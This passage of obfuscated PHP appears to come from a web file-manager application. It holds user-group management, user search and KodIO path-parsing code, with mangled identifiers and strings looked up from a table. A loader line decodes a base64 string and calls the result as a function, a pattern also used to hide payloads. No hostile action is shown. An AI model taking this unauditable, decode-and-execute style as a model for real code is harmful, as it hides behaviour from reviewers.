$”Š‰Ÿˆ·) { $Ï˜´š†› = array($ã»«½ƒ—[1768] => $¶•è , $ã»«½ƒ—[1969] => $×©…úç“, $ã»«½ƒ—[2077] => $”Š‰Ÿˆ·); $Ï˜´š†›[$ã»«½ƒ—[1993]] = isset($æÉàÁ‰Ì[$„”£ÓÍ÷]) ? $æÉàÁ‰Ì[$„”£ÓÍ÷] : 0; $„”£ÓÍ÷++; $î¼·óçä[] = $Ï˜´š†›; } return $ŸÁ¥˜Ñè->addAll($î¼·óçä, array(), !0); } protected function userGroupAdd($óêÒ±¶ä, $›¤ºÅ¡ = array()) { $ë¼Ä”™ =& $_SERVER[Ò°Ì”İ•]; $ĞÃšµÇ = $this->getInfoSimple($óêÒ±¶ä); if (!$ĞÃšµÇ || empty($›¤ºÅ¡)) { return !1; } $ÂÏ†±‚ = array(); foreach ($›¤ºÅ¡ as $ìŞË€†• => $ïÍıêçü) { $ÂÏ†±‚[] = array($ë¼Ä”™[1768] => $óêÒ±¶ä, $ë¼Ä”™[1969] => $ìŞË€†•, $ë¼Ä”™[2077] => $ïÍıêçü, $ë¼Ä”™[1993] => 0); } return Model($ë¼Ä”™[2063])->addAll($ÂÏ†±‚, array(), !0); } protected function userGroupRemove($“ ¡Š•Ò, $»İ»óï) { $—ÚÚ™–ï =& $_SERVER[Ò°Ì”İ•]; $Ò¿¡ëÆ = $this->getInfoSimple($“ ¡Š•Ò); if (!$Ò¿¡ëÆ || !$»İ»óï) { return !1; } $€àçÉ•ë = array($—ÚÚ™–ï[1759] => $“ ¡Š•Ò, $—ÚÚ™–ï[2061] => $»İ»óï); return Model($—ÚÚ™–ï[2063])->where($€àçÉ•ë)->delete(); } public function listData() { $¯»°í†Ç = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¯»°í†Ç[$_SERVER[Ò°Ì”İ•][457]]); return $¯»°í†Ç; } public function listByID($©òÅÍº¥) { $´‰…”ü =& $_SERVER[Ò°Ì”İ•]; if (!$©òÅÍº¥) { return; } $”ø‰íúÛ = array($´‰…”ü[1768] => array($´‰…”ü[7], $©òÅÍº¥)); $—×¡õ¹Ö = $this->where($”ø‰íúÛ)->select(); $—×¡õ¹Ö = array_sort_keep($—×¡õ¹Ö, $´‰…”ü[1768], $©òÅÍº¥); $this->_listDataApply($—×¡õ¹Ö); return $—×¡õ¹Ö; } public function listByGroup($ò“ñ”Â² = 0, $Äµë€‰¹ = array()) { $êíŒí´š =& $_SERVER[Ò°Ì”İ•]; $ÕĞûÍ½ = $êíŒí´š[12]; $åü¹úù = array(); if ($ò“ñ”Â²) { $åü¹úù = array($êíŒí´š[2495] => intval($ò“ñ”Â²)); $ÕĞûÍ½ = "\114\105\106\x54\x20\x4a\117\x49\116\x20{$this->tablePrefix}\x75\x73\x65\x72\x5f\147\x72\157\165\x70\40\165\x73\145\162\137\x67\x72\157\165\x70\40\157\x6e\x20\165\x73\145\162\x2e\165\x73\145\162\x49\x44\x20\x3d\x20\x75\x73\x65\162\x5f\x67\162\x6f\x75\160\x2e\165\x73\145\162\x49\104"; $ä½Ô»š³ = Input::get($êíŒí´š[542], null, $êíŒí´š[12]) ? $êíŒí´š[12] : $êíŒí´š[2496]; } if (isset($Äµë€‰¹[$êíŒí´š[823]])) { $åü¹úù[$êíŒí´š[2497]] = $Äµë€‰¹[$êíŒí´š[823]]; } $ÆØˆÏ¾ = $this->_makeOrder($ä½Ô»š³)->field($êíŒí´š[2498])->where($åü¹úù)->join($ÕĞûÍ½)->selectPage(50); $this->_listDataApply($ÆØˆÏ¾[$êíŒí´š[457]]); return $ÆØˆÏ¾; } private function _makeOrder($¥—úœË° = '') { $¿ù¬ßÃ“ =& $_SERVER[Ò°Ì”İ•]; $©øÀ×ÔÔ = array($¿ù¬ßÃ“[1768], $¿ù¬ßÃ“[32], $¿ù¬ßÃ“[1957], $¿ù¬ßÃ“[2176], $¿ù¬ßÃ“[1929], $¿ù¬ßÃ“[244]); $é½ã£– = array($¿ù¬ßÃ“[535] => $¿ù¬ßÃ“[536], $¿ù¬ßÃ“[537] => $¿ù¬ßÃ“[538]); $÷³‘œê– = Input::get($¿ù¬ßÃ“[542], $¿ù¬ßÃ“[7], $¿ù¬ßÃ“[1759], $©øÀ×ÔÔ); $ñÌ¥Ä¹ú = Input::get($¿ù¬ßÃ“[543], $¿ù¬ßÃ“[7], $¿ù¬ßÃ“[2064], array($¿ù¬ßÃ“[2064], $¿ù¬ßÃ“[537])); $ñÌ¥Ä¹ú = $é½ã£–[$ñÌ¥Ä¹ú]; $¥—úœË° = $¥—úœË° . "\165\x73\x65\162\56{$÷³‘œê–}\x20{$ñÌ¥Ä¹ú}\54\x20\x75\x73\x65\162\56\x75\x73\x65\162\111\x44\x20\x61\x73\x63"; return $this->alias($¿ù¬ßÃ“[2192])->order($¥—úœË°); } public function listSearch($•Å‹Â…á) { $Â‚æüáè =& $_SERVER[Ò°Ì”İ•]; $ø°ú²ªµ = trim($•Å‹Â…á[$Â‚æüáè[2067]]); $ĞÊŠ§ãÔ = explode($Â‚æüáè[53], $ø°ú²ªµ); if (!$ø°ú²ªµ || count($ĞÊŠ§ãÔ) == 1) { return $this->listSearchNow($•Å‹Â…á); } $™ï™¦ÕÛ = array($Â‚æüáè[457] => array()); foreach ($ĞÊŠ§ãÔ as $†“³ÜÌ±) { if (!trim($†“³ÜÌ±)) { continue; } $•Å‹Â…á[$Â‚æüáè[2067]] = $†“³ÜÌ±; $ „õ¿´ = $this->listSearchNow($•Å‹Â…á); $™ï™¦ÕÛ[$Â‚æüáè[457]] = array_merge($™ï™¦ÕÛ[$Â‚æüáè[457]], $ „õ¿´[$Â‚æüáè[457]]); } $™ï™¦ÕÛ[$Â‚æüáè[457]] = array_unique_by_key($™ï™¦ÕÛ[$Â‚æüáè[457]], $Â‚æüáè[1768]); $™ï™¦ÕÛ[$Â‚æüáè[454]] = array($Â‚æüáè[455] => count($™ï™¦ÕÛ[$Â‚æüáè[457]]), $Â‚æüáè[451] => 20, $Â‚æüáè[440] => 1, $Â‚æüáè[456] => 1); return $™ï™¦ÕÛ; } public function listSearchNow($ôÆş’‰’) { $ğÈ¹§»ª =& $_SERVER[Ò°Ì”İ•]; $–ñÈäç = trim($ôÆş’‰’[$ğÈ¹§»ª[2067]]); $®·ë ‡Ş = isset($ôÆş’‰’[$ğÈ¹§»ª[2068]]) ? $ôÆş’‰’[$ğÈ¹§»ª[2068]] : !1; $–ñÈäç = str_replace($ğÈ¹§»ª[2069], $ğÈ¹§»ª[2070], trim($–ñÈäç)); $¥Ãü¶– = array($ğÈ¹§»ª[32] => array($ğÈ¹§»ª[471], "\x25{$–ñÈäç}\x25"), $ğÈ¹§»ª[392] => array($ğÈ¹§»ª[471], "{$–ñÈäç}\45"), $ğÈ¹§»ª[2264] => array($ğÈ¹§»ª[471], "{$–ñÈäç}\45"), $ğÈ¹§»ª[1073] => $ğÈ¹§»ª[2071]); if (Input::check($–ñÈäç, $ğÈ¹§»ª[398])) { $¥Ãü¶–[$ğÈ¹§»ª[1768]] = array($ğÈ¹§»ª[471], "{$–ñÈäç}\45"); $¥Ãü¶–[$ğÈ¹§»ª[2480]] = array($ğÈ¹§»ª[471], "{$–ñÈäç}\45"); } if (!$–ñÈäç) { $¥Ãü¶– = array(); } if (isset($ôÆş’‰’[$ğÈ¹§»ª[823]])) { $¥Ãü¶–[$ğÈ¹§»ª[823]] = $ôÆş’‰’[$ğÈ¹§»ª[823]]; } $¥Ãü¶– = $this->parseWhereLike($¥Ãü¶–); $Ùˆ¯ÂÊñ = $this->_makeOrder()->where($¥Ãü¶–)->selectPage(20); if (!$Ùˆ¯ÂÊñ || count($Ùˆ¯ÂÊñ[$ğÈ¹§»ª[457]]) < 5 && Input::check($–ñÈäç, $ğÈ¹§»ª[405])) { $ş­’ËİÉ = $this->_searchFromMeta($ğÈ¹§»ª[549], $–ñÈäç, 10); $ßÒ«Ûƒ½ = $this->_searchFromMeta($ğÈ¹§»ª[550], $–ñÈäç, 10); $¯šªı±î = array_merge($ş­’ËİÉ, $ßÒ«Ûƒ½, $Ùˆ¯ÂÊñ[$ğÈ¹§»ª[457]]); $Ùˆ¯ÂÊñ[$ğÈ¹§»ª[457]] = array_unique_by_key($¯šªı±î, $ğÈ¹§»ª[1768]); $Ùˆ¯ÂÊñ[$ğÈ¹§»ª[454]][$ğÈ¹§»ª[455]] = count($Ùˆ¯ÂÊñ[$ğÈ¹§»ª[457]]); $Ùˆ¯ÂÊñ[$ğÈ¹§»ª[454]][$ğÈ¹§»ª[456]] = ceil($Ùˆ¯ÂÊñ[$ğÈ¹§»ª[454]][$ğÈ¹§»ª[455]] / $Ùˆ¯ÂÊñ[$ğÈ¹§»ª[454]][$ğÈ¹§»ª[451]]); } $this->_listDataApply($Ùˆ¯ÂÊñ[$ğÈ¹§»ª[457]]); $this->_filterByGroup($Ùˆ¯ÂÊñ, $®·ë ‡Ş); return $Ùˆ¯ÂÊñ; } private function _filterByGroup(&$ª³ö—ÙĞ, $®ƒ½µˆŸ) { $•ÌÃŠ¿¡ =& $_SERVER[Ò°Ì”İ•]; if (!$®ƒ½µˆŸ) { return $ª³ö—ÙĞ; } foreach ($ª³ö—ÙĞ[$•ÌÃŠ¿¡[457]] as $¢éÖ˜è¦ => &$Œ€®€óÜ) { $¢ñÁêÜ = array_to_keyvalue($Œ€®€óÜ[$•ÌÃŠ¿¡[2161]], $•ÌÃŠ¿¡[12], $•ÌÃŠ¿¡[1969]); if (!in_array($®ƒ½µˆŸ, $¢ñÁêÜ)) { unset($ª³ö—ÙĞ[$•ÌÃŠ¿¡[457]][$¢éÖ˜è¦]); } } unset($Œ€®€óÜ); $ª³ö—ÙĞ[$•ÌÃŠ¿¡[457]] = array_values($ª³ö—ÙĞ[$•ÌÃŠ¿¡[457]]); $ª³ö—ÙĞ[$•ÌÃŠ¿¡[454]] = array($•ÌÃŠ¿¡[2229] => count($ª³ö—ÙĞ[$•ÌÃŠ¿¡[457]]), $•ÌÃŠ¿¡[2227] => $ª³ö—ÙĞ[$•ÌÃŠ¿¡[454]][$•ÌÃŠ¿¡[451]], $•ÌÃŠ¿¡[2226] => 1, $•ÌÃŠ¿¡[2228] => 1); } private function _searchFromMeta($ˆ‘²Æåù, $¨¿ÑÖ, $Òìúíş) { $¦€†‘å° =& $_SERVER[Ò°Ì”İ•]; $¨¿ÑÖ = strtolower($¨¿ÑÖ); $”òí­ç£ = array($¦€†‘å°[108] => $ˆ‘²Æåù, $¦€†‘å°[462] => array($¦€†‘å°[471], "\x25{$¨¿ÑÖ}\x25")); $”òí­ç£ = $this->parseWhereLike($”òí­ç£); $½Ä—üÉÄ = Model($¦€†‘å°[2499])->where($”òí­ç£)->limit($Òìúíş)->select(); if (!$½Ä—üÉÄ) { return array(); } $½Ä—üÉÄ = array_to_keyvalue($½Ä—üÉÄ, $¦€†‘å°[12], $¦€†‘å°[1768]); $ûˆª¬ö = $this->where(array($¦€†‘å°[1759] => array($¦€†‘å°[7], $½Ä—üÉÄ)))->select(); if (!$ûˆª¬ö) { return array(); } return $ûˆª¬ö; } private function _listDataApplyItem($¼ì¾è÷µ) { $ûÂÊ„€Ô = array($¼ì¾è÷µ); $this->_listDataApply($ûÂÊ„€Ô); return $ûÂÊ„€Ô[0]; } private function _listDataApply(&$Æ­ñ°ƒ¼) { $Ğú™Ãú =& $_SERVER[Ò°Ì”İ•]; if (!$Æ­ñ°ƒ¼) { return; } array_remove_key($Æ­ñ°ƒ¼, $Ğú™Ãú[962]); $­Æ“­À = array_to_keyvalue($Æ­ñ°ƒ¼, $Ğú™Ãú[12], $Ğú™Ãú[1768]); $this->_listAppendGroup($Æ­ñ°ƒ¼, $­Æ“­À); $this->_listAppendMeta($Æ­ñ°ƒ¼, $­Æ“­À); $this->_listAppendSourceRoot($Æ­ñ°ƒ¼, $­Æ“­À); } private function _listAppendSourceRoot(&$Ü³·«Ô¹, $ş‡¿®çˆ) { $¨Î·É¾ƒ =& $_SERVER[Ò°Ì”İ•]; $ıã˜‚êÙ = Model($¨Î·É¾ƒ[898])->listSourceRoot(SourceModel::TYPE_USER, $ş‡¿®çˆ); $ıã˜‚êÙ = array_to_keyvalue($ıã˜‚êÙ, $¨Î·É¾ƒ[581]); $ıã˜‚êÙ = array_remove_key($ıã˜‚êÙ, $¨Î·É¾ƒ[581]); foreach ($Ü³·«Ô¹ as &$û¦÷·Æ) { $û¦÷·Æ[$¨Î·É¾ƒ[101]] = $ıã˜‚êÙ[$û¦÷·Æ[$¨Î·É¾ƒ[1768]]] ? $ıã˜‚êÙ[$û¦÷·Æ[$¨Î·É¾ƒ[1768]]] : array(); } unset($û¦÷·Æ); } private function _listAppendGroup(&$«î³ì’³, $®‹´‰ì) { $Şúµ«µû =& $_SERVER[Ò°Ì”İ•]; $ÉÉÊ¬‡š = array($Şúµ«µû[1768] => array($Şúµ«µû[7], $®‹´‰ì)); $×ó˜ï¼ = Model($Şúµ«µû[2063])->where($ÉÉÊ¬‡š)->select(); $ÎÖÃ’ÍÔ = array_to_keyvalue($×ó˜ï¼, $Şúµ«µû[12], $Şúµ«µû[1969]); $ÎÖÃ’ÍÔ = array_remove_value(array_unique($ÎÖÃ’ÍÔ), $Şúµ«µû[241]); if (!$ÎÖÃ’ÍÔ || !$×ó˜ï¼) { return; } $ÉÉÊ¬‡š = array($Şúµ«µû[1969] => array($Şúµ«µû[7], $ÎÖÃ’ÍÔ)); $˜ôÄßÕ¼ = Model($Şúµ«µû[2159])->field($Şúµ«µû[2500])->where($ÉÉÊ¬‡š)->select(); $˜ôÄßÕ¼ = array_to_keyvalue($˜ôÄßÕ¼, $Şúµ«µû[1969]); $×ó˜ï¼ = array_to_keyvalue_group($×ó˜ï¼, $Şúµ«µû[1768]); foreach ($×ó˜ï¼ as &$ìéäœª) { $³‰öµß = array(); foreach ($ìéäœª as $Â—¦ÎÉ€) { if (!$Â—¦ÎÉ€[$Şúµ«µû[2077]]) { continue; } $õî¾âÜ = Model($Şúµ«µû[583])->listData($Â—¦ÎÉ€[$Şúµ«µû[2077]]); $³‰öµß[] = array($Şúµ«µû[1969] => $Â—¦ÎÉ€[$Şúµ«µû[1969]], $Şúµ«µû[2501] => $˜ôÄßÕ¼[$Â—¦ÎÉ€[$Şúµ«µû[1969]]][$Şúµ«µû[32]], $Şúµ«µû[596] => $˜ôÄßÕ¼[$Â—¦ÎÉ€[$Şúµ«µû[1969]]][$Şúµ«µû[596]], $Şúµ«µû[499] => $õî¾âÜ); } $ìéäœª = $³‰öµß; } unset($ìéäœª); foreach ($«î³ì’³ as &$ÄšóÆ˜) { $ÄšóÆ˜[$Şúµ«µû[2161]] = array(); if (isset($×ó˜ï¼[$ÄšóÆ˜[$Şúµ«µû[1768]]])) { $ÄšóÆ˜[$Şúµ«µû[2161]] = $×ó˜ï¼[$ÄšóÆ˜[$Şúµ«µû[1768]]]; } } unset($ÄšóÆ˜); } public function userAppendGroup($•Ñ—ğÄ¹) { $àÜúÛ”Í =& $_SERVER[Ò°Ì”İ•]; if (!$•Ñ—ğÄ¹) { return array(); } $this->_listAppendGroup($•Ñ—ğÄ¹, array_to_keyvalue($•Ñ—ğÄ¹, $àÜúÛ”Í[12], $àÜúÛ”Í[1768])); return $•Ñ—ğÄ¹; } private function _listAppendMeta(&$ç·ÇÃ, $ªàê£¾) { $öƒÕùûş =& $_SERVER[Ò°Ì”İ•]; $›å­ÁÖò = UserJobModel::JOB_KEY; $ö«¦©å¶ = array($öƒÕùûş[2481]); $±ı×¢ñİ = array($öƒÕùûş[1768] => array($öƒÕùûş[7], $ªàê£¾)); $¦Ç—í¢ğ = Model($öƒÕùûş[2479])->where($±ı×¢ñİ)->select(); $¦Ç—í¢ğ = array_to_keyvalue_group($¦Ç—í¢ğ, $öƒÕùûş[1768]); foreach ($¦Ç—í¢ğ as &$ã‰ÕÇÛÅ) { $õ†×Ô  = array(); foreach ($ã‰ÕÇÛÅ as $ğ ÂÅ¶¢) { if (!in_array($ğ ÂÅ¶¢[$öƒÕùûş[108]], $ö«¦©å¶)) { $õ†×Ô [$ğ ÂÅ¶¢[$öƒÕùûş[108]]] = $ğ ÂÅ¶¢[$öƒÕùûş[462]]; } } $ã‰ÕÇÛÅ = $õ†×Ô ; } unset($ã‰ÕÇÛÅ); $“ä”ÛŒ = Model($öƒÕùûş[2502]); foreach ($ç·ÇÃ as &$Çú¨¼Ö) { $¶¦¾× Ì = array(); if (isset($¦Ç—í¢ğ[$Çú¨¼Ö[$öƒÕùûş[1768]]])) { $¶¦¾× Ì = $¦Ç—í¢ğ[$Çú¨¼Ö[$öƒÕùûş[1768]]]; } $Çú¨¼Ö[$öƒÕùûş[2503]] = array(); if (isset($¶¦¾× Ì[$›å­ÁÖò])) { $Çú¨¼Ö[$öƒÕùûş[2503]] = $“ä”ÛŒ->getUserJobInfo($¶¦¾× Ì[$›å­ÁÖò]); } } unset($Çú¨¼Ö); } protected function groupUserAll($îÀ¾çœ) { $š¬¨Š¿ù =& $_SERVER[Ò°Ì”İ•]; if (!$îÀ¾çœ) { return !1; } $¾«’Ñ½§ = Model($š¬¨Š¿ù[2063])->field($š¬¨Š¿ù[1768])->where(array($š¬¨Š¿ù[1969] => array($š¬¨Š¿ù[7], $îÀ¾çœ)))->select(); $¾«’Ñ½§ = array_to_keyvalue($¾«’Ñ½§, $š¬¨Š¿ù[12], $š¬¨Š¿ù[1768]); return array_unique($¾«’Ñ½§); } public function userSearch($º ƒÔ¶”, $ûåş¶Ú = "\x2a") { return Model($_SERVER[Ò°Ì”İ•][609])->where($º ƒÔ¶”)->field($ûåş¶Ú)->find(); } } goto Bˆ±¢œ»§; eñ÷ô¡·¹’: $fileSize = strrev(base64_decode($_SERVER[ïÓ’¤‘Ï][0])); function binCheckNeq($ÒŞª«óà, $» ÈœÎ¬) { return $ÒŞª«óà != $» ÈœÎ¬; } $_SERVER[$_SERVER[ïÓ’¤‘Ï][1]] = $fileSize($_SERVER[$_SERVER[ïÓ’¤‘Ï][2]]); goto c¡äßƒÄ; cá–ì¯ä«Ù: class KodIO { const KOD_SOURCE = "\173\x73\157\x75\162\143\145\175"; const KOD_USER_RECYCLE = "\x7b\x75\x73\145\x72\122\x65\x63\171\x63\x6c\x65\175"; const KOD_USER_FAV = "\173\165\163\x65\162\x46\141\166\175"; const KOD_USER_FILE_TAG = "\173\x75\163\145\x72\106\x69\154\145\124\x61\147\175"; const KOD_USER_FILE_TYPE = "\173\165\x73\x65\x72\x46\151\x6c\x65\x54\171\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\x6f\x75\x70\122\157\x6f\164\123\145\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\163\145\162\123\150\141\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\165\163\145\162\123\150\141\x72\x65\114\x69\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\141\162\145\124\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\173\163\x68\141\x72\145\111\x74\145\155\175"; const KOD_SHARE_LINK = "\x7b\163\150\x61\x72\x65\x49\x74\x65\155\x4c\x69\x6e\153\175"; const KOD_SEARCH = "\173\x73\145\141\x72\x63\150\x7d"; const KOD_BLOCK = "\173\x62\154\x6f\x63\x6b\175"; const KOD_IO = "\x7b\151\157\x7d"; const KOD_USER_RECENT = "\173\x75\x73\x65\162\x52\x65\x6e\143\x65\156\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\x69\166\145\x72\x7d"; public static function typeList() { $‚îŠîˆ˜ =& $_SERVER[Ò°Ì”İ•]; return array($‚îŠîˆ˜[1332] => self::KOD_SOURCE, $‚îŠîˆ˜[1333] => self::KOD_USER_RECYCLE, $‚îŠîˆ˜[1334] => self::KOD_USER_FAV, $‚îŠîˆ˜[1335] => self::KOD_USER_FILE_TAG, $‚îŠîˆ˜[1336] => self::KOD_USER_FILE_TYPE, $‚îŠîˆ˜[1337] => self::KOD_GROUP_ROOT_SELF, $‚îŠîˆ˜[1338] => self::KOD_USER_SHARE, $‚îŠîˆ˜[1339] => self::KOD_USER_SHARE_LINK, $‚îŠîˆ˜[1340] => self::KOD_USER_SHARE_TO_ME, $‚îŠîˆ˜[1341] => self::KOD_SHARE_ITEM, $‚îŠîˆ˜[1342] => self::KOD_SHARE_LINK, $‚îŠîˆ˜[1343] => self::KOD_SEARCH, $‚îŠîˆ˜[1344] => self::KOD_BLOCK, $‚îŠîˆ˜[1345] => self::KOD_IO, $‚îŠîˆ˜[1346] => self::KOD_USER_RECENT, $‚îŠîˆ˜[1347] => self::KOD_USER_DRIVER); } public static function parse($²ÁŒ»ö‡) { $§šó¡³ =& $_SERVER[Ò°Ì”İ•]; $²ÁŒ»ö‡ = self::clear($²ÁŒ»ö‡); $‚òö§ç = array_values(self::typeList()); preg_match($§šó¡³[1348], $²ÁŒ»ö‡, $¹«ûøÙ—); $Œ¥òÛ« = array($§šó¡³[508] => !1, $§šó¡³[1349] => !1, $§šó¡³[505] => !1, $§šó¡³[98] => $²ÁŒ»ö‡, $§šó¡³[1247] => !1, $§šó¡³[1246] => $§šó¡³[12]); if (is_array($¹«ûøÙ—) && count($¹«ûøÙ—) == 5) { $¤Ê—ß› = $§šó¡³[1350] . $¹«ûøÙ—[2] . $§šó¡³[414]; if (in_array($¤Ê—ß›, $‚òö§ç)) { $Œ¥òÛ«[$§šó¡³[1247]] = $¹«ûøÙ—[1]; $Œ¥òÛ«[$§šó¡³[33]] = $¤Ê—ß›; $Œ¥òÛ«[$§šó¡³[1351]] = substr($¤Ê—ß›, 1, -1); $Œ¥òÛ«[$§šó¡³[487]] = $¹«ûøÙ—[3]; } $Œ¥òÛ«[$§šó¡³[1246]] = $¹«ûøÙ—[4]; } $¡¸ÜÚ¸æ = array($§šó¡³[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Œ¥òÛ«[$§šó¡³[1314]] = in_array($Œ¥òÛ«[$§šó¡³[33]], $¡¸ÜÚ¸æ); return $Œ¥òÛ«; } public static function isTruePath($³¬Ğß) { $¡¼ÌÕİ =& $_SERVER[Ò°Ì”İ•]; if (substr($³¬Ğß, 0, 1) != $¡¼ÌÕİ[1350]) { return !0; } if (strpos($³¬Ğß, $¡¼ÌÕİ[495]) === 0) { return !0; } if (strpos($³¬Ğß, $¡¼ÌÕİ[1318]) === 0) { return !0; } if (strpos($³¬Ğß, $¡¼ÌÕİ[1352]) === 0) { return !0; } if (strpos($³¬Ğß, $¡¼ÌÕİ[1353]) === 0) { return !0; } if (strpos($³¬Ğß, $¡¼ÌÕİ[1354]) === 0) { return !0; } return !1; } public static function clear($ªÇ©Û±ñ) { $³ëÌ® =& $_SERVER[Ò°Ì”İ•]; $ªÇ©Û±ñ = str_replace(array($³ëÌ®[1152], $³ëÌ®[59]), $³ëÌ®[53], $ªÇ©Û±ñ); $ªÇ©Û±ñ = str_replace($³ëÌ®[111], $³ëÌ®[8], $ªÇ©Û±ñ); $å÷¹†ä† = $³ëÌ®[1355]; if (substr($ªÇ©Û±ñ, 0, 3) == $³ëÌ®[1356]) { $ªÇ©Û±ñ = substr($ªÇ©Û±ñ, 3); } while (strstr($ªÇ©Û±ñ, $å÷¹†ä†)) { $ªÇ©Û±ñ = str_replace($å÷¹†ä†, $³ëÌ®[8], $ªÇ©Û±ñ); } $ªÇ©Û±ñ = preg_replace($³ëÌ®[1357], $³ëÌ®[8], $ªÇ©Û±ñ); if ($ªÇ©Û±ñ == $³ëÌ®[8]) { return $³ëÌ®[8]; } $ªÇ©Û±ñ = rtrim($ªÇ©Û±ñ, $³ëÌ®[8]); return $ªÇ©Û±ñ; } public static function pathTrue($…–çùÒÄ) { $¶½…Æ×î =& $_SERVER[Ò°Ì”İ•]; if (!$…–çùÒÄ) { return $¶½…Æ×î[12]; } $…–çùÒÄ = str_replace($¶½…Æ×î[267], $¶½…Æ×î[8], str_replace($¶½…Æ×î[1358], $¶½…Æ×î[8], $…–çùÒÄ)); $…–çùÒÄ = str_replace($¶½…Æ×î[267], $¶½…Æ×î[8], str_replace($¶½…Æ×î[1358], $¶½…Æ×î[8], $…–çùÒÄ)); if (!strstr($…–çùÒÄ, $¶½…Æ×î[1356])) { return $…–çùÒÄ; } $…÷¬˜® = explode($¶½…Æ×î[8], $…–çùÒÄ); foreach ($…÷¬˜® as $¸Õ‰ÃÊ° => $Ê·úéÑ) { if ($Ê·úéÑ !== $¶½…Æ×î[1359]) { continue; } for ($‡™Û•ı¤ = $¸Õ‰ÃÊ°; $‡™Û•ı¤ >= 0; $‡™Û•ı¤--) { if ($…÷¬˜®[$‡™Û•ı¤] === $¶½…Æ×î[10] || $…÷¬˜®[$‡™Û•ı¤] === $¶½…Æ×î[1359] || $…÷¬˜®[$‡™Û•ı¤] === -1) { continue; } if ($…÷¬˜®[$‡™Û•ı¤] === $¶½…Æ×î[12]) { $…÷¬˜®[$¸Õ‰ÃÊ°] = -1; break; } $…÷¬˜®[$¸Õ‰ÃÊ°] = -1; $…÷¬˜®[$‡™Û•ı¤] = -1; break; } } $›Úø«ûŒ = array(); foreach ($…÷¬˜® as $Ê·úéÑ) { if ($Ê·úéÑ !== -1) { $›Úø«ûŒ[] = $Ê·úéÑ; } } $´¹ë•æá = implode($¶½…Æ×î[8], $›Úø«ûŒ); if (strpos($´¹ë•æá, $¶½…Æ×î[1360]) === 0) { $´¹ë•æá = $¶½…Æ×î[1356] . substr($´¹ë•æá, strlen($¶½…Æ×î[1360])); } return $´¹ë•æá; } public static function pathUrlClear($Ô—Ì·Ğ) { $Î¦ƒÀÕÅ =& $_SERVER[Ò°Ì”İ•]; if (!$Ô—Ì·Ğ) { return $Ô—Ì·Ğ; } $Ô—Ì·Ğ = rawurldecode($Ô—Ì·Ğ); $Ô—Ì·Ğ = str_replace($Î¦ƒÀÕÅ[1358], $Î¦ƒÀÕÅ[8], $Ô—Ì·Ğ); if (strpos($Ô—Ì·Ğ, $Î¦ƒÀÕÅ[87]) > 0) { $Ô—Ì·Ğ = substr($Ô—Ì·Ğ, 0, strpos($Ô—Ì·Ğ, $Î¦ƒÀÕÅ[87])); } if (strpos($Ô—Ì·Ğ, $Î¦ƒÀÕÅ[1361]) > 0) { $Ô—Ì·Ğ = substr($Ô—Ì·Ğ, 0, strpos($Ô—Ì·Ğ, $Î¦ƒÀÕÅ[1361])); } return $Ô—Ì·Ğ; } public static function sourceID($¶¯‰£‹æ) { $¤€€†ÜÁ =& $_SERVER[Ò°Ì”İ•]; $–Ğ®’´ = self::parse($¶¯‰£‹æ); if ($–Ğ®’´[$¤€€†ÜÁ[33]] !== self::KOD_SOURCE) { show_json(LNG($¤€€†ÜÁ[1362]), !1); } return $–Ğ®’´[$¤€€†ÜÁ[487]]; } public static function make($ıîÛ¼şî) { if (!$ıîÛ¼şî) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ıîÛ¼şî)); } public static function makeShare($œóÙŒşÔ, $ Ğ…Á¥°) { return self::makePath(self::KOD_SHARE_ITEM, $œóÙŒşÔ, $ Ğ…Á¥°); } public static function makeFileTypePath($î§ú£«) { return self::makePath(self::KOD_USER_FILE_TYPE, $î§ú£«); } public static function makeFileTagPath($Òë¢¾ü) { return self::makePath(self::KOD_USER_FILE_TAG, $Òë¢¾ü); } public static function makePath($ÄŒ™ú¤š, $¿û§Ü³º = '', $ª†—×ë = '') { $‰¶«ÅÜ† =& $_SERVER[Ò°Ì”İ•]; $·Š™ = substr($ÄŒ™ú¤š, 1, -1); $¿Ãß×® = $‰¶«ÅÜ†[1363] . $·Š™ . $‰¶«ÅÜ†[1364] . $¿û§Ü³º . $‰¶«ÅÜ†[1365]; $¿Ãß×® = $ª†—×ë ? $¿Ãß×® . $ª†—×ë . $‰¶«ÅÜ†[8] : $¿Ãß×®; return $¿Ãß×®; } public static function hashPath($ó˜ö‹¦Š, $ÂÎõşÀƒ = true) { $Öú—ñ£â =& $_SERVER[Ò°Ì”İ•]; $èË¡”ø = is_array($ó˜ö‹¦Š) ? $ó˜ö‹¦Š : IO::info($ó˜ö‹¦Š); $ ä€‚Î = _get($èË¡”ø, $Öú—ñ£â[1366], $Öú—ñ£â[12]); if (!$ ä€‚Î && isset($èË¡”ø[$Öú—ñ£â[248]])) { $ ä€‚Î = trim($èË¡”ø[$Öú—ñ£â[248]], $Öú—ñ£â[132]); } if (!$ ä€‚Î && isset($èË¡”ø[$Öú—ñ£â[204]]) && $èË¡”ø[$Öú—ñ£â[204]]) { $èË¡”ø = IO::info(KodIO::make($èË¡”ø[$Öú—ñ£â[204]])); $ ä€‚Î = _get($èË¡”ø, $Öú—ñ£â[1366], $Öú—ñ£â[12]); } $¼áÔù½Â = md5($èË¡”ø[$Öú—ñ£â[98]] . $èË¡”ø[$Öú—ñ£â[90]] . $èË¡”ø[$Öú—ñ£â[99]]); if (!$ ä€‚Î && file_exists($èË¡”ø[$Öú—ñ£â[98]])) { $ ä€‚Î = Cache::get($¼áÔù½Â . $Öú—ñ£â[1367]); $ ä€‚Î = !1; if (!$ ä€‚Î) { $ ä€‚Î = IO::hashSimple($èË¡”ø[$Öú—ñ£â[98]]); Cache::set($¼áÔù½Â . $Öú—ñ£â[1367], $ ä€‚Î, 3600 * 24 * 30); } } if ($ÂÎõşÀƒ && !$ ä€‚Î) { } return $ ä€‚Î ? $ ä€‚Î : $¼áÔù½Â; } public static function hashPathSafe($ñîÔ˜¸Ø, $—±–·ï‘ = true) { $à£ş™ Ì =& $_SERVER[Ò°Ì”İ•]; $¡Ó˜‰ö = self::hashPath($ñîÔ˜¸Ø, $—±–·ï‘); return 